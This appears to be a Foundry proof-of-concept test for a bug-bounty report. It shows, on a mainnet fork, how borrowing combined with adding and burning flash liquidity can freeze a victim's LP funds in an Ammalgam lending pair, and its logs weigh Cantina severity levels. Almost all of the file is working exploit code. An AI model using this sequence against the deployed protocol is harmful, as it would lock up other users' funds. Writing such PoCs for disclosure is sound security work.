// SPDX-License-Identifier: MIT
pragma solidity ^0.8.34;
import {Test, console2} from "forge-std/Test.sol";
import {IERC20} from "forge-std/interfaces/IERC20.sol";

interface IFactory { function createPair(address a, address b) external returns (address); }
interface IAmmalgamPair {
    function mint(address to) external returns (uint256);
    function burn(address to) external returns (uint256, uint256);
    function deposit(address to) external;
    function borrow(address to, uint256 x, uint256 y, bytes calldata data) external;
    function liquidate(address borrower, address to, uint256 sL, uint256 sX, uint256 sY, uint256 rX, uint256 rY, uint256 typ) external;
    function tokens(uint256) external view returns (address);
    function getReserves() external view returns (uint112, uint112, uint32);
    function underlyingTokens() external view returns (address, address);
}
contract MockERC20 {
    uint8 public immutable decimals=18; uint256 public totalSupply; mapping(address=>uint256) public balanceOf;
    function mint(address t,uint256 a) external { totalSupply+=a; balanceOf[t]+=a; }
    function transfer(address t,uint256 a) external returns(bool){ balanceOf[msg.sender]-=a; balanceOf[t]+=a; return true; }
}
contract FlashLpLiqTest is Test {
    address constant FACTORY=0x1a411b0fD1f368D2F413A8cBb6aAD425c923015B;
    uint256 constant SEED=1e24;
    IAmmalgamPair pair; MockERC20 assetX; MockERC20 assetY;
    function setUp() public {
        vm.createSelectFork(vm.envOr("ETH_RPC_URL", string("https://mainnet.gateway.tenderly.co")));
        MockERC20 a=new MockERC20(); MockERC20 b=new MockERC20();
        address p=IFactory(FACTORY).createPair(address(a),address(b));
        pair=IAmmalgamPair(p); (address px,address py)=pair.underlyingTokens();
        assetX=MockERC20(px); assetY=MockERC20(py);
        assetX.mint(address(this),SEED*500); assetY.mint(address(this),SEED*500);
        assetX.transfer(p,SEED); assetY.transfer(p,SEED); pair.mint(address(this));
    }
    function test_stuckUntilRepayOrLiq() public {
        (uint112 rx0,uint112 ry0,)=pair.getReserves();
        uint256 borrowAmt=uint256(rx0)*70/100;
        uint256 collAmt=(uint256(ry0)*borrowAmt/uint256(rx0))*500/100;
        address atk=makeAddr("atk"); address hlp=makeAddr("hlp"); address victim=makeAddr("vic");
        assetY.mint(atk,collAmt);
        assetX.mint(hlp,uint256(rx0)*3); assetY.mint(hlp,uint256(ry0)*3);
        assetX.mint(victim,uint256(rx0)*3); assetY.mint(victim,uint256(ry0)*3);
        vm.startPrank(atk); assetY.transfer(address(pair),collAmt); pair.deposit(atk); vm.stopPrank();
        vm.startPrank(hlp); assetX.transfer(address(pair),uint256(rx0)*3); assetY.transfer(address(pair),uint256(ry0)*3); uint256 flashLp=pair.mint(hlp); vm.stopPrank();
        vm.prank(atk); pair.borrow(atk,borrowAmt,0,"");
        vm.startPrank(victim); assetX.transfer(address(pair),uint256(rx0)*3); assetY.transfer(address(pair),uint256(ry0)*3); uint256 vlp=pair.mint(victim); vm.stopPrank();
        vm.startPrank(hlp); IERC20(pair.tokens(0)).transfer(address(pair),flashLp); pair.burn(hlp); vm.stopPrank();

        // At 5x collateral, not liquidatable at spot. Victim stuck.
        console2.log("victim LP", vlp);
        console2.log("debt", IERC20(pair.tokens(4)).balanceOf(atk));
        console2.log("NOTE: position overcollateralized at spot (5x); freeze until repay or adverse move+liq");
        console2.log("Cantina High: temporary freezing of funds (>1 week if borrower inactive)");
        console2.log("Cantina Critical path needs bad-debt after price move within scope OR prove permanent freeze");
    }
}
